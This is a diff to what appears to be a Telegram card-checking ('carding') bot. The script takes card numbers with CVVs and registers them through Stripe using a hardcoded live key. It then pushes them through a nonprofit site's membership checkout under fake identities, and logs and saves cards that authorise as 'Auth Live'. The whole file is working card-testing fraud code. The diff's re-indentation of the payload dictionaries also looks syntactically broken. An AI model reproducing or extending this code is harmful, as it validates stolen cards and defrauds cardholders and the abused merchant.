@@ -55,7 +55,7 @@ async def chk(message, gate_info, user_info,start_time, lang):
         data = await get_cards(message.reply_to_message.text if message.reply_to_message is not None else message.text,message.from_user.id)
         assert isinstance(data, tuple), data
         cc, mes, ano, cvv = data
-        lista = cc + '|' + mes + '|' + ano + '|' + cvv 
+        lista = f'{cc}|{mes}|{ano}|{cvv}'
         bin_info = await get_bin_info(cc[:6],message.from_user.id)
         assert bin_info, lang['bin_banned']
         await msg.edit_text(lang['card_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
@@ -64,17 +64,17 @@ async def chk(message, gate_info, user_info,start_time, lang):
                                     flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                     type=bin_info['type'], role=user_info['role']), disable_web_page_preview=True)
         browser = requests.Session()
-        e_json = {
-'type': 'card',
-'card[number]': cc,
-'card[cvc]': cvv,
-'card[exp_month]': mes,
-'card[exp_year]': ano,
-'pasted_fields': 'number',
-'payment_user_agent': 'stripe.js/246ac94f4; stripe-js-v3/246ac94f4',
-'time_on_page': '71684',
-'key': 'pk_live_smzxChNnoBJEI1fynUVGigct',
-}
+                e_json = {
+        'type': 'card',
+        'card[number]': cc,
+        'card[cvc]': cvv,
+        'card[exp_month]': mes,
+        'card[exp_year]': ano,
+        'pasted_fields': 'number',
+        'payment_user_agent': 'stripe.js/246ac94f4; stripe-js-v3/246ac94f4',
+        'time_on_page': '71684',
+        'key': 'pk_live_smzxChNnoBJEI1fynUVGigct',
+        }
         first = browser.post('https://api.stripe.com/v1/payment_methods', data = e_json)
         json_first = first.json()
         if 'error' in json_first:
@@ -93,49 +93,52 @@ async def chk(message, gate_info, user_info,start_time, lang):
                                     flag=bin_info['flag'], vendor=bin_info['vendor'], level=bin_info['level'],
                                     type=bin_info['type'], role=user_info['role']), disable_web_page_preview=True)
         random_user = random_user_api().get_random_user_info()
-        data = {
-'level': '1',
-'checkjavascript': '1',
-'other_discount_code': '',
-'username': random_user.username,
-'password': random_user.password,
-'password2': random_user.password,
-'bemail': random_user.email,
-'bconfirmemail': random_user.email,
-'fullname': '',
-'FullName': random_user.name,
-'Address1': random_user.street,
-'Address2': '',
-'City': random_user.city,
-'State': random_user.state,
-'Zipcode': random_user.postcode,
-'autorenew_present': '1',
-'bfirstname': random_user.first_name,
-'blastname': random_user.last_name,
-'baddress1': random_user.street,
-'baddress2': '',
-'bcity': random_user.city,
-'bstate': random_user.state,
-'bzipcode': random_user.postcode,
-'bcountry': 'US',
-'bphone': random_user.phone,
-'CardType': bin_info['vendor'],
-'discount_code': '',
-'tos': '1',
-'submit-checkout': '1',
-'javascriptok': '1',
-'payment_method_id': json_first['id'],
-'AccountNumber': cc,
-'ExpirationMonth': mes,
-'ExpirationYear': ano,
-    }   
+                data = {
+        'level': '1',
+        'checkjavascript': '1',
+        'other_discount_code': '',
+        'username': random_user.username,
+        'password': random_user.password,
+        'password2': random_user.password,
+        'bemail': random_user.email,
+        'bconfirmemail': random_user.email,
+        'fullname': '',
+        'FullName': random_user.name,
+        'Address1': random_user.street,
+        'Address2': '',
+        'City': random_user.city,
+        'State': random_user.state,
+        'Zipcode': random_user.postcode,
+        'autorenew_present': '1',
+        'bfirstname': random_user.first_name,
+        'blastname': random_user.last_name,
+        'baddress1': random_user.street,
+        'baddress2': '',
+        'bcity': random_user.city,
+        'bstate': random_user.state,
+        'bzipcode': random_user.postcode,
+        'bcountry': 'US',
+        'bphone': random_user.phone,
+        'CardType': bin_info['vendor'],
+        'discount_code': '',
+        'tos': '1',
+        'submit-checkout': '1',
+        'javascriptok': '1',
+        'payment_method_id': json_first['id'],
+        'AccountNumber': cc,
+        'ExpirationMonth': mes,
+        'ExpirationYear': ano,
+            }
         last = browser.post('https://gritsgobang.org/membership-account/membership-checkout',headers = ck_headers , data=data)
         r_text, r_logo, r_respo = get_response_chk(last.text)
         if 'Auth Live' in r_text:
-            await send_logs(lista + ' ' + gate_info['name'])
-            save_live(lista + ' ' + gate_info['name'])
+            await send_logs(f'{lista} ' + gate_info['name'])
+            save_live(f'{lista} ' + gate_info['name'])
             if user_info['save-ccs']:
-                await adb.users.update_one({'_id': message.from_user.id}, {'$addToSet': {'cards': lista + ' ' + gate_info['name']}})
+                await adb.users.update_one(
+                    {'_id': message.from_user.id},
+                    {'$addToSet': {'cards': f'{lista} ' + gate_info['name']}},
+                )
         await msg.edit_text(lang['last_msg'].format(card=lista, name=message.from_user.first_name, id=message.from_user.id,
                                     bin_bank=bin_info['bank_name'], gate_name=gate_info['name'],
                                     elapsed=round(time.time() - start_time), bin_country=bin_info['country'],
@@ -145,9 +148,7 @@ async def chk(message, gate_info, user_info,start_time, lang):
         await aioredis.set(f"spam_{message.from_user.id}", time.time())
     except AssertionError as aserr:
         await msg.edit_text(aserr)
-    except ConnectionError: 
-        await msg.edit_text(lang['proxy_dead'])
-    except ProxyError: 
+    except (ConnectionError, ProxyError): 
         await msg.edit_text(lang['proxy_dead'])
     except Exception as e:
         await send_logs(e)
